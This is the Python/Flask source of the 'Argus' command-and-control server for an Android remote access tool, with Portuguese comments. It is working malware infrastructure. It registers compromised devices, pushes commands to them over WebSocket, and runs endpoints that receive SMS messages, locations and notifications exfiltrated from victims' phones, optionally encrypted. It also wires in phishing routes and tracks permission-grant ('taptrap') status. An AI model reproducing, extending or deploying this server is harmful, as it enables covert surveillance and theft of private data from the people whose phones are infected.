"""
Servidor Flask C2 com integração completa de banco de dados
Sistema Argus - Android Remote Access Tool
"""

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file
from flask_socketio import SocketIO, emit
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import os
import sys
import json
import datetime
import uuid
from typing import Dict, List, Optional
from werkzeug.utils import secure_filename
import csv
import io
import logging

# Adicionar diretório database ao path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from config import get_config
from database.backend.database_manager import DatabaseManager, db
from database.backend.models import Device, Command, User
from backend.military import register_military_routes
from backend.phishing import register_phishing_routes

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Criar aplicação Flask
app = Flask(__name__)

# Carregar configurações
config = get_config()
app.config.from_object(config)
config.init_app(app)

# Inicializar SocketIO


#  SocketIO(app, cors_allowed_origins="*",  
#                     ping_timeout=app.config['SOCKETIO_PING_TIMEOUT'],
#                     ping_interval=app.config['SOCKETIO_PING_INTERVAL'])
socketio = SocketIO(
    app,
    async_mode="threading",  # avoid eventlet (not compatible with Python 3.13)
    cors_allowed_origins="*",
    ping_timeout=app.config.get("SOCKETIO_PING_TIMEOUT", 60),
    ping_interval=app.config.get("SOCKETIO_PING_INTERVAL", 25)
)


# Inicializar Rate Limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

# Inicializar DatabaseManager
db_manager = DatabaseManager(app)

# Criar tabelas e dados padrão
with app.app_context():
    db_manager.create_tables()
    try:
        db_manager.create_default_data()
    except Exception as e:
        logger.info(f"Dados padrão já existem: {e}")

# Registrar rotas militares
register_military_routes(app)

# Registrar rotas de phishing
register_phishing_routes(app)

# ====================== UTILITY FUNCTIONS ======================

def allowed_file(filename):
    """Verifica se extensão do arquivo é permitida"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

def login_required(f):
    """Decorator para rotas que requerem autenticação"""
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

def device_to_dict(device):
    """Converte Device model para dicionário com formatação"""
    if not device:
        return None
    
    return {
        'device_id': device.device_id,
        'device_name': device.device_name,
        'model': device.model,
        'manufacturer': device.manufacturer,
        'android_version': device.android_version,
        'api_level': device.api_level,
        'app_version': device.app_version,
        'status': device.status,
        'ip_address': device.ip_address,
        'last_seen': device.last_seen.isoformat() if device.last_seen else None,
        'first_seen': device.first_seen.isoformat() if device.first_seen else None,
        'battery_level': device.battery_level,
        'is_charging': device.is_charging,
        'latitude': device.latitude,
        'longitude': device.longitude,
        'taptrap_completed': device.taptrap_completed,
        'permissions_granted': device.permissions_granted or []
    }

# ====================== AUTHENTICATION ROUTES ======================

@app.route('/')
def index():
    """Rota principal - redireciona para dashboard ou login"""
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
@limiter.limit("5 per minute")
def login():
    """Rota de login"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        user = User.query.filter_by(username=username).first()
        
        if user and user.check_password(password):
            session['username'] = username
            session['user_id'] = user.id
            session['user_role'] = user.role
            
            # Atualizar último login
            user.last_login = datetime.datetime.utcnow()
            db.session.commit()
            
            db_manager.log_system_event(
                'user_login',
                'authentication',
                f'Usuário {username} fez login',
                user_id=user.id,
                severity='info'
            )
            
            logger.info(f"Login bem-sucedido: {username}")
            return jsonify({'status': 'success', 'redirect': url_for('dashboard')})
        else:
            logger.warning(f"Tentativa de login falhou para: {username}")
            return jsonify({'status': 'error', 'message': 'Credenciais inválidas'})
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Rota de logout"""
    username = session.get('username')
    if username:
        db_manager.log_system_event(
            'user_logout',
            'authentication',
            f'Usuário {username} fez logout',
            severity='info'
        )
    
    session.clear()
    logger.info(f"Logout: {username}")
    return redirect(url_for('login'))

# ====================== DASHBOARD ROUTES ======================

@app.route('/dashboard')
@login_required
def dashboard():
    """Dashboard principal com estatísticas"""
    try:
        stats = db_manager.get_dashboard_stats()
        devices = Device.query.order_by(Device.last_seen.desc()).limit(5).all()
        
        dashboard_data = {
            'stats': stats,
            'recent_devices': [device_to_dict(d) for d in devices],
            'now': datetime.datetime.utcnow()
        }
        
        return render_template('dashboard.html', **dashboard_data)
    
    except Exception as e:
        logger.error(f"Erro no dashboard: {e}")
        return render_template('dashboard.html', stats={}, recent_devices=[], 
                              now=datetime.datetime.utcnow())

@app.route('/devices')
@login_required
def devices():
    """Página de dispositivos"""
    try:
        devices_list = Device.query.all()
        
        online_count = Device.query.filter_by(status='online').count()
        offline_count = Device.query.filter_by(status='offline').count()
        
        # Dispositivos vistos nas últimas 24 horas
        yesterday = datetime.datetime.utcnow() - datetime.timedelta(hours=24)
        recent_count = Device.query.filter(Device.last_seen >= yesterday).count()
        
        return render_template('devices.html',
                             devices=[device_to_dict(d) for d in devices_list],
                             online_count=online_count,
                             offline_count=offline_count,
                             recent_count=recent_count,
                             now=datetime.datetime.utcnow())
    
    except Exception as e:
        logger.error(f"Erro ao carregar dispositivos: {e}")
        return render_template('devices.html', devices=[], 
                             online_count=0, offline_count=0, recent_count=0,
                             now=datetime.datetime.utcnow())

@app.route('/commands')
@login_required
def commands():
    """Página de comandos"""
    try:
        commands_list = Command.query.order_by(Command.created_at.desc()).limit(100).all()
        devices_list = Device.query.all()
        
        stats = {
            'total_commands': Command.query.count(),
            'executed_commands': Command.query.filter_by(status='executed').count(),
            'pending_commands': Command.query.filter_by(status='pending').count(),
            'failed_commands': Command.query.filter_by(status='failed').count()
        }
        
        return render_template('commands.html',
                             commands=[cmd.to_dict() for cmd in commands_list],
                             devices=[device_to_dict(d) for d in devices_list],
                             stats=stats)
    
    except Exception as e:
        logger.error(f"Erro ao carregar comandos: {e}")
        return render_template('commands.html', commands=[], devices=[], stats={})

@app.route('/payloads')
@login_required
def payloads():
    """Página de payloads - REMOVIDA na v.2.0 (sem dropper/dex)"""
    # Redirecionar para dashboard pois não usamos mais payloads dinâmicos
    return redirect(url_for('dashboard'))

@app.route('/logs')
@login_required
def logs():
    """Página de logs"""
    try:
        page = int(request.args.get('page', 1))
        limit = 50
        offset = (page - 1) * limit
        
        # Filtros
        filters = {}
        if request.args.get('type'):
            filters['type'] = request.args.get('type')
        if request.args.get('period'):
            filters['period'] = request.args.get('period')
        
        # Buscar logs (implementar método específico se necessário)
        from database.backend.models import DeviceLog, SystemEvent
        
        device_logs = DeviceLog.query.order_by(DeviceLog.timestamp.desc()).limit(limit).offset(offset).all()
        system_events = SystemEvent.query.order_by(SystemEvent.timestamp.desc()).limit(limit).offset(offset).all()
        
        logs_list = [log.to_dict() for log in device_logs] + [event.to_dict() for event in system_events]
        logs_list = sorted(logs_list, key=lambda x: x.get('timestamp', ''), reverse=True)[:limit]
        
        total_logs = DeviceLog.query.count() + SystemEvent.query.count()
        total_pages = (total_logs + limit - 1) // limit
        
        stats = {
            'total_logs': total_logs,
            'recent_logs': DeviceLog.query.filter(
                DeviceLog.timestamp >= datetime.datetime.utcnow() - datetime.timedelta(hours=1)
            ).count(),
            'error_logs': DeviceLog.query.filter_by(severity='critical').count() + \
                         SystemEvent.query.filter_by(severity='critical').count()
        }
        
        return render_template('logs.html',
                             logs=logs_list,
                             stats=stats,
                             page=page,
                             total_pages=total_pages,
                             has_prev=page > 1,
                             has_next=page < total_pages,
                             devices=[device_to_dict(d) for d in Device.query.all()],
                             now=datetime.datetime.utcnow())
    
    except Exception as e:
        logger.error(f"Erro ao carregar logs: {e}")
        return render_template('logs.html', logs=[], stats={}, page=1, total_pages=0,
                             has_prev=False, has_next=False, devices=[],
                             now=datetime.datetime.utcnow())

# ====================== API ROUTES - DEVICES ======================

@app.route('/api/devices', methods=['GET'])
@login_required
def api_get_devices():
    """API: Listar todos os dispositivos"""
    try:
        devices = Device.query.all()
        return jsonify([device_to_dict(d) for d in devices])
    except Exception as e:
        logger.error(f"Erro ao buscar dispositivos: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/<device_id>', methods=['GET', 'DELETE'])
@login_required
def api_device(device_id):
    """API: Obter ou deletar dispositivo específico"""
    try:
        device = Device.query.filter_by(device_id=device_id).first()
        
        if request.method == 'GET':
            if device:
                return jsonify(device_to_dict(device))
            return jsonify({'error': 'Dispositivo não encontrado'}), 404
        
        elif request.method == 'DELETE':
            if db_manager.delete_device(device_id):
                db_manager.log_system_event(
                    'device_deleted',
                    'device',
                    f'Dispositivo {device_id} removido',
                    user_id=session.get('user_id'),
                    severity='warning'
                )
                return jsonify({'status': 'success'})
            return jsonify({'error': 'Dispositivo não encontrado'}), 404
    
    except Exception as e:
        logger.error(f"Erro em api_device: {e}")
        return jsonify({'error': str(e)}), 500

# ====================== API ROUTES - COMMANDS ======================

@app.route('/api/command', methods=['POST'])
@login_required
def api_send_command():
    """API: Enviar comando para dispositivo"""
    try:
        data = request.json
        device_id = data.get('device_id')
        command_type = data.get('command_type')
        
        if not device_id or not command_type:
            return jsonify({'error': 'device_id e command_type são obrigatórios'}), 400
        
        # Criar comando no banco
        command = db_manager.create_command(
            device_id=device_id,
            command_type=command_type,
            command_data=data.get('data', {}),
            created_by=session.get('username'),
            priority=data.get('priority', 'normal')
        )
        
        db_manager.log_system_event(
            'command_created',
            'command',
            f'Comando {command_type} criado para dispositivo {device_id}',
            user_id=session.get('user_id'),
            details={'command_id': command.command_id, 'command_type': command_type}
        )
        
        # Emitir via WebSocket
        socketio.emit('new_command', {
            'command_id': command.command_id,
            'device_id': device_id,
            'command_type': command_type,
            'data': data.get('data', {})
        }, broadcast=True)
        
        logger.info(f"Comando criado: {command.command_id} para {device_id}")
        return jsonify({'command_id': command.command_id, 'status': 'created'})
    
    except Exception as e:
        logger.error(f"Erro ao criar comando: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/<command_id>', methods=['GET', 'DELETE'])
@login_required
def api_command(command_id):
    """API: Obter ou deletar comando"""
    try:
        command = Command.query.filter_by(command_id=command_id).first()
        
        if request.method == 'GET':
            if command:
                return jsonify(command.to_dict())
            return jsonify({'error': 'Comando não encontrado'}), 404
        
        elif request.method == 'DELETE':
            if command:
                db.session.delete(command)
                db.session.commit()
                logger.info(f"Comando removido: {command_id}")
                return jsonify({'status': 'success'})
            return jsonify({'error': 'Comando não encontrado'}), 404
    
    except Exception as e:
        logger.error(f"Erro em api_command: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/<command_id>/cancel', methods=['POST'])
@login_required
def api_cancel_command(command_id):
    """API: Cancelar comando pendente"""
    try:
        command = Command.query.filter_by(command_id=command_id).first()
        
        if command and command.status == 'pending':
            command.status = 'cancelled'
            db.session.commit()
            
            logger.info(f"Comando cancelado: {command_id}")
            return jsonify({'status': 'success'})
        
        return jsonify({'error': 'Comando não encontrado ou não pode ser cancelado'}), 400
    
    except Exception as e:
        logger.error(f"Erro ao cancelar comando: {e}")
        return jsonify({'error': str(e)}), 500

# ====================== API ROUTES - PAYLOADS (REMOVIDO NA v.2.0) ======================
# Não usamos mais payloads dinâmicos .dex na versão simplificada

# ====================== API ENDPOINTS (ANDROID CLIENT) ======================

@app.route('/api/device/register', methods=['POST'])
@limiter.limit("10 per minute")
def api_device_register():
    """Endpoint para registro de dispositivos Android (com suporte a criptografia)"""
    try:
        # Verificar se dados estão criptografados
        content_type = request.headers.get('Content-Type', '')
        device_id = request.headers.get('X-Device-ID', '')
        
        if content_type == 'application/octet-stream':
            # Dados criptografados
            from crypto.encryption import decrypt
            encrypted_data = request.data
            
            try:
                decrypted_json = decrypt(encrypted_data.decode('utf-8'), 
                                        app.config['ENCRYPTION_KEY'])
                device_data = json.loads(decrypted_json)
            except Exception as e:
                logger.error(f"Erro ao descriptografar dados de registro: {e}")
                return jsonify({'error': 'Falha na descriptografia'}), 400
        else:
            # Dados em texto plano (fallback)
            device_data = request.get_json()
        
        # Registrar dispositivo
        device = db_manager.register_device(device_data)
        
        if device:
            # Preparar resposta
            response_data = {
                'success': True,
                'device_id': device.device_id,
                'message': 'Dispositivo registrado com sucesso',
                'server_time': datetime.datetime.utcnow().isoformat()
            }
            
            # Criptografar resposta se cliente suporta
            if content_type == 'application/octet-stream':
                from crypto.encryption import encrypt
                encrypted_response = encrypt(json.dumps(response_data), 
                                            app.config['ENCRYPTION_KEY'])
                return encrypted_response, 200, {'Content-Type': 'application/octet-stream'}
            else:
                return jsonify(response_data), 200
        else:
            return jsonify({'error': 'Falha ao registrar dispositivo'}), 500
            
    except Exception as e:
        logger.error(f"Erro no endpoint de registro: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/data/exfiltrate', methods=['POST'])
def api_data_exfiltrate():
    """Endpoint para receber dados exfiltrados dos dispositivos (SMS, Localização, etc.)"""
    try:
        device_id = request.headers.get('X-Device-ID', '')
        content_type = request.headers.get('Content-Type', '')
        
        if not device_id:
            return jsonify({'error': 'Device ID não fornecido'}), 400
        
        # Verificar se dados estão criptografados
        if content_type == 'application/octet-stream':
            # Dados criptografados
            from crypto.encryption import decrypt
            encrypted_data = request.data
            
            try:
                decrypted_json = decrypt(encrypted_data.decode('utf-8'), 
                                        app.config['ENCRYPTION_KEY'])
                payload_data = json.loads(decrypted_json)
            except Exception as e:
                logger.error(f"Erro ao descriptografar dados exfiltrados: {e}")
                return jsonify({'error': 'Falha na descriptografia'}), 400
        else:
            # Dados em texto plano (fallback)
            payload_data = request.get_json()
        
        data_type = payload_data.get('data_type')
        data = payload_data.get('data')
        
        if not data_type or not data:
            return jsonify({'error': 'Dados incompletos'}), 400
        
        # Armazenar dados conforme o tipo
        try:
            if data_type == 'sms':
                db_manager.store_sms_message(device_id, data)
                logger.info(f"SMS exfiltrado de {device_id}")
                
            elif data_type == 'location':
                db_manager.store_location(device_id, data)
                logger.info(f"Localização exfiltrada de {device_id}")
                
            elif data_type == 'notification':
                db_manager.store_notification(device_id, data)
                logger.info(f"Notificação exfiltrada de {device_id}")
                
            else:
                # Armazenar como log genérico
                db_manager.create_device_log(
                    device_id=device_id,
                    log_type='data_exfiltrated',
                    message=f"{data_type} data received",
                    data=data
                )
                logger.info(f"Dados genéricos exfiltrados: {data_type} de {device_id}")
            
            # Emitir evento WebSocket para dashboard
            socketio.emit('new_data', {
                'device_id': device_id,
                'data_type': data_type,
                'timestamp': datetime.datetime.utcnow().isoformat()
            }, broadcast=True)
            
            response_data = {
                'success': True,
                'message': 'Dados recebidos com sucesso'
            }
            
            # Criptografar resposta se cliente suporta
            if content_type == 'application/octet-stream':
                from crypto.encryption import encrypt
                encrypted_response = encrypt(json.dumps(response_data), 
                                            app.config['ENCRYPTION_KEY'])
                return encrypted_response, 200, {'Content-Type': 'application/octet-stream'}
            else:
                return jsonify(response_data), 200
                
        except Exception as e:
            logger.error(f"Erro ao armazenar dados exfiltrados: {e}")
            return jsonify({'error': str(e)}), 500
            
    except Exception as e:
        logger.error(f"Erro no endpoint de exfiltração: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/<command_id>/result', methods=['POST'])
def api_command_result(command_id):
    """Endpoint para receber resultados de comandos executados"""
    try:
        device_id = request.headers.get('X-Device-ID', '')
        content_type = request.headers.get('Content-Type', '')
        
        if not device_id:
            return jsonify({'error': 'Device ID não fornecido'}), 400
        
        # Descriptografar dados se necessário
        if content_type == 'application/octet-stream':
            from crypto.encryption import decrypt
            encrypted_data = request.data
            
            try:
                decrypted_json = decrypt(encrypted_data.decode('utf-8'), 
                                        app.config['ENCRYPTION_KEY'])
                result_data = json.loads(decrypted_json)
            except Exception as e:
                logger.error(f"Erro ao descriptografar resultado do comando: {e}")
                return jsonify({'error': 'Falha na descriptografia'}), 400
        else:
            result_data = request.get_json()
        
        # Buscar comando
        command = Command.query.filter_by(id=command_id).first()
        
        if not command:
            return jsonify({'error': 'Comando não encontrado'}), 404
        
        # Atualizar comando com resultado
        success = result_data.get('success', False)
        message = result_data.get('message', '')
        data = result_data.get('data', {})
        
        command.status = 'completed' if success else 'failed'
        command.result = data
        command.executed_at = datetime.datetime.utcnow()
        
        db.session.commit()
        
        # Criar log
        db_manager.create_device_log(
            device_id=device_id,
            log_type='command_result',
            message=f"Comando {command_id} {command.status}: {message}",
            data={'command_id': command_id, 'result': data}
        )
        
        # Emitir evento WebSocket
        socketio.emit('command_updated', {
            'command_id': command_id,
            'status': command.status,
            'result': data,
            'message': message
        }, broadcast=True)
        
        logger.info(f"Resultado do comando {command_id} recebido de {device_id}")
        
        response_data = {
            'success': True,
            'message': 'Resultado recebido'
        }
        
        if content_type == 'application/octet-stream':
            from crypto.encryption import encrypt
            encrypted_response = encrypt(json.dumps(response_data), 
                                        app.config['ENCRYPTION_KEY'])
            return encrypted_response, 200, {'Content-Type': 'application/octet-stream'}
        else:
            return jsonify(response_data), 200
            
    except Exception as e:
        logger.error(f"Erro ao processar resultado do comando: {e}")
        return jsonify({'error': str(e)}), 500

# ====================== WEBSOCKET EVENTS ======================

@socketio.on('connect')
def handle_connect():
    """Evento: Cliente conectado"""
    logger.info('Cliente WebSocket conectado')
    emit('connection_status', {
        'status': 'connected',
        'message': 'Conectado ao servidor C2',
        'server_time': datetime.datetime.utcnow().isoformat()
    })

@socketio.on('disconnect')
def handle_disconnect():
    """Evento: Cliente desconectado"""
    logger.info('Cliente WebSocket desconectado')

@socketio.on('device_register')
def handle_device_register(data):
    """Evento: Registro de dispositivo"""
    try:
        device_info = {
            'device_id': data['device_id'],
            'device_name': data.get('device_name'),
            'model': data.get('model'),
            'manufacturer': data.get('manufacturer'),
            'android_version': data.get('android_version'),
            'api_level': data.get('api_level'),
            'app_version': data.get('app_version'),
            'ip_address': request.remote_addr
        }
        
        device = db_manager.register_device(device_info)
        
        db_manager.log_device_event(
            device.device_id,
            'system',
            'device',
            f'Dispositivo {device.model} registrado',
            severity='info'
        )
        
        emit('device_registered', {'device': device_to_dict(device)}, broadcast=True)
        emit('device_connected', {'device': device_to_dict(device)}, broadcast=True)
        
        logger.info(f"Dispositivo registrado: {device.device_id}")
    
    except Exception as e:
        logger.error(f"Erro ao registrar dispositivo: {e}")
        emit('error', {'message': str(e)})

@socketio.on('device_heartbeat')
def handle_device_heartbeat(data):
    """Evento: Heartbeat de dispositivo"""
    try:
        device_id = data['device_id']
        additional_info = data.get('additional_info', {})
        
        device = db_manager.update_device_status(device_id, 'online', additional_info)
        
        if device:
            emit('device_updated', {
                'device_id': device_id,
                'status': 'online',
                'last_seen': device.last_seen.isoformat()
            }, broadcast=True)
    
    except Exception as e:
        logger.error(f"Erro no heartbeat: {e}")

@socketio.on('command_executed')
def handle_command_executed(data):
    """Evento: Comando executado"""
    try:
        command_id = data['command_id']
        result = data.get('result')
        status = data.get('status', 'executed')
        error_message = data.get('error_message')
        
        command = db_manager.update_command_status(command_id, status, result, error_message)
        
        if command:
            db_manager.log_device_event(
                command.device.device_id,
                'command',
                'execution',
                f'Comando {command.command_type} executado com status: {status}',
                details={'result': result},
                severity='info' if status == 'executed' else 'warning'
            )
            
            emit('command_updated', {
                'command_id': command_id,
                'status': status,
                'result': result
            }, broadcast=True)
            
            logger.info(f"Comando executado: {command_id} - Status: {status}")
    
    except Exception as e:
        logger.error(f"Erro ao processar comando executado: {e}")

@socketio.on('data_exfiltrated')
def handle_data_exfiltrated(data):
    """Evento: Dados exfiltrados do dispositivo"""
    try:
        device_id = data['device_id']
        data_type = data['data_type']
        payload_data = data['data']
        
        # Armazenar conforme o tipo
        if data_type == 'sms':
            db_manager.store_sms_message(device_id, payload_data)
        elif data_type == 'location':
            db_manager.store_location(device_id, payload_data)
        elif data_type == 'notification':
            db_manager.store_notification(device_id, payload_data)
        
        # Emitir notificação
        emit('new_data', {
            'device_id': device_id,
            'data_type': data_type,
            'timestamp': datetime.datetime.utcnow().isoformat()
        }, broadcast=True)
        
        logger.info(f"Dados exfiltrados: {data_type} de {device_id}")
    
    except Exception as e:
        logger.error(f"Erro ao processar dados exfiltrados: {e}")

# ====================== MAIN ======================

if __name__ == '__main__':
    print("=" * 60)
    print("   ARGUS C2 Server - Android Remote Access System")
    print("=" * 60)
    print(f"Ambiente: {app.config['ENV'] if hasattr(app.config, 'ENV') else 'development'}")
    print(f"Servidor iniciando em: {app.config['C2_SERVER_HOST']}:{app.config['C2_SERVER_PORT']}")
    print(f"URL Pública: {app.config['C2_PUBLIC_URL']}")
    print(f"WebSocket: {app.config['C2_WEBSOCKET_URL']}")
    print(f"Database: {app.config['SQLALCHEMY_DATABASE_URI'][:50]}...")
    print("-" * 60)
    print(f"Dashboard: http://localhost:{app.config['C2_SERVER_PORT']}/dashboard")
    print(f"Login padrão: admin / admin123")
    print("=" * 60)
    
    socketio.run(
        app,
        debug=app.config.get('DEBUG', False),
        host=app.config['C2_SERVER_HOST'],
        port=app.config['C2_SERVER_PORT']
    )



